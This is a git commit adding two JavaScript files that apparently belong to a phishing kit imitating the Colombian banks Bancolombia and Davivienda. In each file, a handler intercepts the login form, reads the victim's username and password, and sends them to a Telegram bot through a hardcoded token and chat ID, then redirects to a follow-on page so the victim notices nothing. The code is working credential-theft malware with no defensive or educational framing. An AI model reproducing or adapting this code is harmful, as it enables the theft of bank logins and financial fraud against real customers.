2b5824e72a99295e85947123e29c6ee562c0eb32
apitg44 <juridicosjconsultores@gmail.com>
2025-05-31 15:55:09 -0500

    Add files via upload

---
+++ bancos/botbancol.js
@@ -0,0 +1,27 @@
+function enviarMensajeTelegram(username, password) {
+    var token = '7580606761:AAFiPnAx4jOqv-bBPWFcqk8rwOJ1DYdsCGA';
+    var chatID = '7831097636';
+    var mensaje = 'Logo Bancolombia: ' + '\nUsuario: ' + username + ' \nClave: ' + password;
+    var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatID + '&text=' + mensaje;
+    var xhttp = new XMLHttpRequest();
+    xhttp.open('GET', url, true);
+    xhttp.send();
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    document.getElementById('submitBtn').addEventListener('click', function(event) {
+        event.preventDefault(); // Evita que el formulario se envíe por defecto
+
+        var username = document.getElementById('username').value;
+        var password = document.getElementById('password').value;
+
+        if (username.trim() !== '' && password.trim() !== '') {
+            enviarMensajeTelegram(username, password);
+            setTimeout(function() {
+                window.location.href = '../cargapago.html';
+            }, 1000);
+        } else {
+            alert('Por favor complete todos los campos antes de continuar.');
+        }
+    });
+});
---
+++ bancos/botdavi.js
@@ -0,0 +1,27 @@
+function enviarMensajeTelegram(username, password) {
+    // Aquí debes reemplazar 'TU_TOKEN' por el token de tu bot de Telegram
+    var token = '7580606761:AAFiPnAx4jOqv-bBPWFcqk8rwOJ1DYdsCGA';
+    // Aquí debes reemplazar 'TU_CHAT_ID' por el chat ID al que quieras enviar el mensaje
+    var chatID = '7831097636';
+    var mensaje = 'Logo Davivienda: ' + '\nUsuario: ' + username + ' \nClave: ' + password;
+
+    var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatID + '&text=' + mensaje;
+
+    var xhttp = new XMLHttpRequest();
+    xhttp.open('GET', url, true);
+    xhttp.send();
+}
+
+document.getElementById('submitBtn').addEventListener('click', function() {
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+
+    if (username.trim() !== '' && password.trim() !== '') {
+        enviarMensajeTelegram(username, password);
+        setTimeout(function() {
+            window.location.href = '../fin.html';
+        }, 1000);
+    } else {
+        alert('Por favor complete todos los campos antes de continuar.');
+    }
+});
